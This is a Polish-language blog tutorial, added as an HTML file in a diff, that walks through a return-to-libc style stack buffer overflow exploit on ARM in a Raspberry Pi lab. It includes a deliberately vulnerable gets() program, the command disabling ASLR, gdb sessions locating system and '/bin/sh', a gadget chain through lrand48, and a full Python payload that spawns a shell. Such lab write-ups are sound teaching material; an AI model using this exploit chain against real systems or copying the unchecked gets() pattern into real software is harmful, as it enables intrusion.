@@ -1,0 +1,281 @@
+<!--
+Return To Zero - Runda 1
+Jeśli działasz w low level security lub zamierzasz zacząć (niedługo coś o tym napiszę) to pewnie gdzieś już słyszałeś o technice zwanej "Return to Libc" bądź też "Ret2libc". Jest ona wykorzystywana do eksploitacji programów działających pod architekturą x86.
+4 marca, 2019
+hesterhawk01
+http://google.com
+True
+True
+-->
+      <p>
+        Jeśli działasz w low level security lub zamierzasz zacząć (niedługo coś o tym napiszę) to pewnie gdzieś już słyszałeś o technice zwanej "Return to Libc" bądź też "Ret2libc". Jest ona wykorzystywana do eksploitacji programów działających pod architekturą x86.
+      </p>
+
+      <p>
+        Nasuwa się następujące pytanie - czy dany atak moglibyśmy przenieść z powodzeniem na architekturę ARM, którą będziemy się zajmować w dalszej części niniejszej publikacji. Da się, ale do tego zagadnienia musimy podejść trochę inaczej z uwagi na fakt, że x86 i ARM to trochę dwie różne bajki.
+      </p>
+
+      <p>Musimy podejść twórczo.</p>
+
+      <p>
+        Od tego momentu zrobi się bardziej technicznie dlatego też do zrozumienia problemu będziesz potrzebował w swojej głowie informacji z zakresu podstaw asemblera dla procesorów ARM a także podstaw związanych z debugowaniem programu w konkretnym środowisku (tutaj: gdb, linux).
+      </p>
+
+      <h2>Piaskownica</h2>
+
+      <p>
+        Aby móc testować musisz mieć postawione odpowiednie środowisko, które bardzo fajnie zostało opisane na <a target="_blank" class="url" href="https://azeria-labs.com/emulate-raspberry-pi-with-qemu/">tej stronie</a> (swoją drogą jest tam również masa innych bardzo użytecznych informacji - ale o tym później). My oparliśmy swoje laboratorium testowe na Raspberry PI w wersji 2 z systemem Raspbian.
+      </p>
+
+      <p>Na sam początek zapoznajmy się z kodem, na którym będziemy pracowali:</p>
+
+      <pre class="hljs"><code class="c">int main(int argc, char **argv)
+{
+  char buffer[64];
+  gets(buffer);
+}</code></pre>
+
+      <br>
+      <p>
+        Wyłączamy randomizację stosu i kompilujemy kod:    
+      </p>        
+
+      <pre class="hljs"><code class="bash">~$ echo 0 > /proc/sys/kernel/randomize_va_space
+~$ gcc stack5.c -o stack5
+</code></pre>
+<br>
+      <p>
+        Program pobiera ciąg znaków a następnie umieszcza je w zdefiniowanej do tego pamięci bez żadnej kontroli. Jest to typowa podatność przepełnienia stosu (buffer overflow), którą będziemy chcieli wykorzystać do naszych celów.
+        Jeszcze przed rozpoczęciem analizy warto zapoznać się z pewnymi elementarnymi operacjami, które występują podczas “życia” typowej funkcji. Są nimi prolog oraz epilog.                  
+      </p>
+
+      <p>
+        Zobaczmy jak te operacje wyglądają w gdb:
+      </p>
+
+      <pre class="hljs"><code class="bash">~$ gdb stack5
+gef> disas main          
+</code></pre>
+<br>
+      <p>
+        W momencie skoku do funkcji program zapisuje adres następnej instrukcji (po powrocie z funkcji) do rejestru LR. Adres umieszczony w LR razem z adresem znajdującym się w R11 (FP wskaźnik ramki stosu) i innymi danymi (np. zmienne lokalne) jest odkładany na stos. Opisana procedura nosi nazwę "prolog". 
+      </p>
+
+      <p>
+        Dwie ostatnie instrukcje:
+      </p>
+
+      <pre class="hljs"><code class="bash">sub sp, r11, #4
+pop {r11, pc}
+</code></pre>
+<br>
+      <p>
+        to tzw. “epilog”. Rozpatrzymy teraz jak działa on w kontekście naszego programu:
+      </p>
+
+      <pre class="hljs"><code class="bash"># uruchom debugger
+~$ gdb stack5
+# pop {r11, pc} 
+# ustaw breakpoint na ostatnią instrukcję 
+# - adres możesz podejrzeć sobię listując funkcję main "disas main"
+gef> break *0x00010468 
+# uruchom kod
+gef> run
+# podaj losowe dane i lecimy dalej 
+testdata
+[enter]</code></pre>
+<br>
+      <p>Wynik:</p>
+
+      <div class="text-center">
+      <img class="m-bottom-30" src="/pub/1/_blog_rtz02.png">      
+      </div>
+
+      <p>
+        Program wykonując operację "pop {r11, pc}" zdejmie te dwa adresy (0x00000000 oraz 0xb6e8f678) ze stosu i umieści je kolejno w rejestrach R11 i PC (na rysunku powyżej zakreślona jest ramka stosu).
+        Dla przypomnienia rejestr PC - program counter inaczej licznik rozkazów zawierający adres aktualnie wykonywanej instrukcji. W powyższej sytuacji skok do adresu 0xb6e8f678 będzie skokiem do funkcji "exit" - program po pobraniu danych zakończy działanie.                    
+      </p>
+
+      <p>
+        Uruchom jeszcze raz program podając nieco dłuższy ciąg znaków:
+      </p>
+
+      <pre class="hljs"><code class="bash">gef> break *0x00010468
+gef> run
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
+<br>
+      <p>Wynik:</p>
+
+      <img class="m-bottom-30" src="/pub/1/_blog_rtz03.png">      
+
+      <p>
+        I stało się coś dziwnego. Wartość rejestrów PC oraz LR została nadpisana. Program próbuje odwołać się do obszaru pamięci, do której nie ma dostępu - 0x61616161 a to oznacza, że znaleźliśmy miejsce gdzie możemy przejąć kontrolę nad wykonywanym programem. Supi!!        
+      </p>   
+
+      <p>
+        Dobra tylko na czym więc polega trick, dzięki któremu da się wywołać shella na badanym sofcie?        
+      </p>
+
+      <p>
+        Skoro mamy już kontrolę nad rejestrem PC, to może zamiast testowego adresu 0x61616161 wrzucić do niego adres funkcji "system" z parametrem "/bin/sh", która uruchomi nam powłokę systemową? :) Jest to jakiś pomysł.        
+      </p>
+
+      <p>
+        Sam skok do "system" to tylko jeden z elementów ataku - 
+        musimy zatroszczyć się chociażby o to, aby umieścić jej parametr w odpowiednim miejscu w pamięci.
+        Ważna informacja - jedną z różnic pomiędzy architekturami ARM oraz Intel jest nieco inny sposób wywołań funkcji. W ARM ogólnie działa to w ten sposób, że parametry funkcji pobierane są przed jej uruchomieniem z rejestrów ogólnego przeznaczenia np. z R0, R1, R2 itp.        
+      </p>
+
+      <p>
+        Nakreślmy więc sobie w punktach nasz ogólny plan działania:
+      </p>
+
+      <p>
+        <ul>
+          <li>1. znaleźć w pamięci adresy do "/bin/sh" oraz funkcji "system"</li>
+          <li>2. umieścić adres wskazujący na parametr "/bin/sh" w rejestrze R0</li>
+          <li>3. skoczyć do funkcji "system"</li>
+        </ul>
+      </p>
+
+      <p>
+        Zanim przejdziemy do punktów, zerknijmy jeszcze (o ile już tego nie wiesz) jak wygląda z grubsza proces kompilacji programu na systemy linux. Kompilator w pierwszej kolejności przetwarza Twój kod i generuje plik zawierający instrukcje maszynowe w formacie *.o (lub *.obj) tzw. "object file", który nie jest jeszcze wykonywalny przez system. Następnie Object file zostaje przetworzony przez tzw. linker, który tworzy wykonywalny program, gotowy do uruchomienia w systemie.
+      </p>
+
+      <p>
+        Podczas pisania kodu, programista często wykorzystuje różne funkcje, pochodzące z różnych dołączonych bibliotek, które to zostają "dołączone" do programu w procesie konsolidacji (wyróżniamy linkowanie statyczne lub dynamiczne).
+        <a class="url" href="http://jedrzej.ulasiewicz.staff.iiar.pwr.wroc.pl/ProgramowanieWspolbiezne/wyklad/Kompilacja-i-uruch-progr-5.pdf" target="_blank">Tutaj</a> znajdziesz dużo więcej informacji na temat całego procesu kompilacji.
+      </p>
+
+      <p>
+        Program, który wykorzystuje do działania standardową bibliotekę C (libc.so.6) ma także dostęp do innych funkcji zawartych w tej bibliotece. Przykład takiej funkcji na obrazku poniżej:
+      </p>
+
+      <pre class="hljs"><code class="bash">pi@raspberrypi:~/protostar $ ldd stack5
+  /usr/lib/arm-linux-gnueabihf/libarmmem.so (0xb6fb8000)
+  libc.so.6 => /lib/arm-linux-gnueabihf/libc.so.6 (0xb6e79000)
+  /lib/ld-linux-armhf.so.3 (0xb6fce000)
+
+pi@raspberrypi:~/protostar $ objdump -d /lib/arm-linux-gnueabihf/libc.so.6 | grep system
+00037154 <__libc_system@@GLIBC_PRIVATE>:
+    37158:	0a000000 	beq	37160 <__libc_system@@GLIBC_PRIVATE+0xc>
+    37160:	e59f0014 	ldr	r0, [pc, #20]	; 3717c <__libc_system@@GLIBC_PRIVATE+0x28>
+</code></pre>
+
+      <h2>Return to Zero w praktyce</h2>
+
+      <p>
+        Zacznijmy od zapoznania się ze <a target="_blank" class="url" href="https://linux.die.net/man/3/system">składnią funkcji "system"</a>:
+      </p>
+
+      <pre class="hljs"><code class="bash">int system(const char *command);</code></pre>          
+      <br>
+      <p>
+        Jak widzisz, funkcja ta oczekuje jednego argumentu do wywołania - wskaźnika na ciąg znaków. W naszym przypadku chcemy wywołać powłokę systemową dlatego parametrem funkcji będzie ciąg "/bin/sh".
+      </p>
+
+      <p>
+        Adresy szukanego parametru znajdziemy używając gdb + gef:
+      </p>
+
+      <pre class="hljs"><code class="bash">gef> search-pattern "/bin/sh"
+[+] Searching '/bin/sh' in memory
+[+] In '/lib/arm-linux-gnueabihf/libc-2.24.so'(0xb6e79000-0xb6fa2000), permission=r-x
+  0xb6f964d8 - 0xb6f964df ->  "/bin/sh"
+gef> print &system
+$1 = (<text variable, no debug info> *) 0xb6eb0154 <system></code></pre> 
+  <br>
+      <p>
+        Teraz będzie zagadka. Odkryliśmy już pod jakim adresem znajduje się szukany parametr (0xb6f964d8) ale co należy zrobić aby wrzucić teraz ten adres do rejestru R0? Tutaj z pomocą przychodzi nam funkcja "lrand48" dostępna z obszaru bibliotek funkcji dołączonych podczas kompilacji programu. Zobaczmy ją z bliska:        
+      </p>
+
+      <pre class="hljs"><code class="bash">gef> disas lrand48
+Dump of assembler code for function lrand48:
+    0xb6ea7fb8 <+0>:	ldr	r1, [pc, #32]	; 0xb6ea7fe0 <lrand48+40>
+    0xb6ea7fbc <+4>:	push	{lr}		; (str lr, [sp, #-4]!)
+    0xb6ea7fc0 <+8>:	add	r1, pc, r1
+    0xb6ea7fc4 <+12>:	sub	sp, sp, #12
+    0xb6ea7fc8 <+16>:	add	r2, sp, #4
+    0xb6ea7fcc <+20>:	mov	r0, r1
+    0xb6ea7fd0 <+24>:	bl	0xb6ea814c <nrand48_r>
+    0xb6ea7fd4 <+28>:	ldr	r0, [sp, #4]
+    0xb6ea7fd8 <+32>:	add	sp, sp, #12
+    0xb6ea7fdc <+36>:	pop	{pc}		; (ldr pc, [sp], #4)
+    0xb6ea7fe0 <+40>:	andseq	pc, r0, r0, lsr #5
+End of assembler dump.</code></pre>
+<br>
+      <p>
+        Zakreślony kod (a w szczególności “ldr r0, [sp, #4]”) to jest to czego szukamy. Skacząc w pierwszej kolejności do adresu 0xb6ea7fd4 instrukcja LDR (Load with immediate offset) spowoduje załadowanie wartości z rejestru SP powiększonego o 4 bajty do rejestru R0. Tą wartością będzie adres do "/bin/sh" umieszczony na stosie (a przesłany uprzednio w odpowiedniej kolejności przez exploita).
+      </p>
+
+      <p>
+        Tak naprawdę proces opisany powyżej nie jest taki skomplikowany ;)
+        Najlepiej będzie, jeśli prześledzisz sobie cały flow poniżej na ilustracji graficznej:
+      </p>
+
+      <img class="m-bottom-30" src="/pub/1/rtz_flow_01.png"> 
+      <br>
+      <p><b>P1</b><br> Przepełnienie rejestru PC..</p>
+
+      <img class="m-bottom-30" src="/pub/1/rtz_flow_02.png"> 
+      <br>
+      <p>
+        .. a następnie skok do funkcji “lrand48”. Możesz teraz zaobserwować działanie instrukcji "POP {R11, PC}"" i zmianę wartości rejestrów po jej wykonaniu.        
+      </p>
+
+      <img class="m-bottom-30" src="/pub/1/rtz_flow_03.png"> 
+      <br>
+      <p>
+        <b>P2</b><br>Ekstra. Jesteśmy krok od wywołania instrukcji LDR. Nasz payload zostaje zaktualizowany o odpowiednie wartości. Zwróć uwagę na "wypełniacz" (4 bajty "B"), który jest wymagany do tego aby adres “/bin/sh” został załadowany z odpowiedniego miejsca na stosie (adres SP + 4 bajty) do rejestru R0.
+      </p>
+
+      <img class="m-bottom-30" src="/pub/1/rtz_flow_04.png"> 
+      <br>
+      <p>
+        Ostatnim elementem naszej układanki jest skok do funkcji "system". Aby dojść do tego, muszą zostać wykonane dalsze operacje zawarte w funkcji "lrand48", w której aktualnie się znajdujemy. No to co tam mamy dalej..         
+      </p>
+
+      <p>
+        "add sp, sp, 12" - z racji tego, że operacja ta przesuwa wskaźnik stosu o 12 bajtów (w zapisie heksadecymalnym - "c") musimy dodać do naszego payloadu kolejnego "zapychacza" w postaci 4 bajtów (payload -> 4 * C) a dopiero po nim umieścić adres wskazujący na funkcję "system".
+      </p>
+
+      <p>
+        "pop {pc}" - ta operacja jest dopełnieniem powyższego kroku. "Zdejmij adres ze stosu i wrzuć go do rejestru PC", a dokładniej zdejmij adres funkcji "system", na który wskazuje adres umieszczony w rejestrze SP. Uff.. 
+      </p>
+
+      <img src="/pub/1/rtz_flow_05.png">
+      <p class="img-desc">#dziwnytenR2</p>
+
+      <p>
+        The End. Nie pozostaje nam nic innego niż tylko zmontować sobie exploita np. w pythonie..
+      </p>
+      
+      <pre class="hljs"><code class="python">import struct
+p = '\x41' * 68
+p += struct.pack('<\I', 0xb6ea7fd4)
+p += '\x42' * 4
+p += struct.pack('<\I', 0xb6f964d8)
+p += '\x43' * 4
+p += struct.pack('<\I', 0xb6eb0154)
+print(p)</code></pre>
+<br>
+      <p>Jeszcze tylko payload..</p>
+
+      <pre class="hljs"><code class="bash">~$ python exploit.py > payload</code></pre>      
+      <br>
+      <p>To działamy..</p>
+
+      <pre class="hljs"><code class="bash">~$ cat payload - | ./stack5
+ls
+stack5 stack5.c stack5.o</code></pre>      
+<br>
+      <p>
+        Sukces! Chociaż tak naprawdę podczas eksperymentów nie obyło się bez mniejszych lub większych problemów.
+      </p>
+
+      <p>
+        Tymczasem bardzo zapraszam Cię na <a class="url" href="https://squadron31.com/show/pl/return-to-zero-part-2"><b>*rundę drugą*</b></a>, która jest dopełnieniem tego artykułu.
+        <br>Znajdziesz tam problemy jakie wystąpiły podczas researchu, sekcję FAQ i zagadkę.
+      </p>
+
+      <p class="is-pulled-right">research: Mateusz Wójcik</p>      
